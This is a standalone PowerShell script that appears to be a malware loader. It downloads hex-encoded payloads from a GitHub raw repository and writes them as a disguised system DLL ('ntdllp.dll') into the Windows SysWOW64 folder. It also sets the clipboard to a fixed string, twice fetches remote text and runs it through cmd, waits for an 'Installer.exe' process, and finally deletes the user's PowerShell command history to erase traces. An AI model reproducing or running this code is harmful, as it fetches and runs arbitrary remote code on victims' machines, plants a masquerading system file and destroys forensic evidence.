$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
$urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.ps1"
$filePath = "C:\Windows\SysWOW64\ntdllp.dll"
$clipText = "SteF6b2WrAgu"
function HexToBytes {
    param([string]$hexStr)
    # Remove any non-hex characters (anything not 0-9, A-F, a-f)
    $cleanHex = [regex]::Replace($hexStr, '[^0-9A-Fa-f]', '')
    if ($cleanHex.Length % 2 -ne 0) {
        Write-Error "Cleaned hex string has an odd length: $($cleanHex.Length)"
        return $null
    }
    $byteArr = [byte[]]::new($cleanHex.Length / 2)
    for ($i = 0; $i -lt $cleanHex.Length; $i += 2) {
        $byteArr[$i/2] = [convert]::ToByte($cleanHex.Substring($i, 2), 16)
    }
    return $byteArr
}
try {
    $responseA = Invoke-WebRequest -Uri $urlA -UseBasicParsing -TimeoutSec 30
    $hexContent = $responseA.Content
    $bytes = HexToBytes $hexContent
    if ($bytes -ne $null) {
        [IO.File]::WriteAllBytes($filePath, $bytes)
    } else {
        Write-Error "Failed to convert hex content from $urlA to bytes."
        exit 1
    }
} catch {
    Write-Error "Failed to download or process file from $urlA`: $_"
    exit 1
}
Set-Clipboard $clipText
try {
    $responseB = Invoke-WebRequest -Uri $urlB -UseBasicParsing -TimeoutSec 30
    $cmdToRun = $responseB.Content.Trim()
    if ($cmdToRun) {
        Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
    }
} catch {
    Write-Error "Failed to download or execute command from $urlB`: $_"
    exit 1
}
do {
    Start-Sleep -Seconds 2
} while (Get-Process -Name "Installer.exe" -ErrorAction SilentlyContinue)
try {
    $responseC = Invoke-WebRequest -Uri $urlC -UseBasicParsing -TimeoutSec 30
    $newHexContent = $responseC.Content
    $newBytes = HexToBytes $newHexContent
    if ($newBytes -ne $null) {
        [IO.File]::WriteAllBytes($filePath, $newBytes)
    } else {
        Write-Error "Failed to convert hex content from $urlC to bytes."
    }
} catch {
    Write-Error "Failed to download or process file from $urlC`: $_"
}
try {
    $responseD = Invoke-WebRequest -Uri $urlD -UseBasicParsing -TimeoutSec 30
    $finalCmdContent = $responseD.Content.Trim()
    if ($finalCmdContent) {
        Start-Process cmd -ArgumentList "/c $finalCmdContent" -NoNewWindow
    }
} catch {
    Write-Error "Failed to download or execute command from $urlD`: $_"
}
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine*.txt" -Force -ErrorAction SilentlyContinue
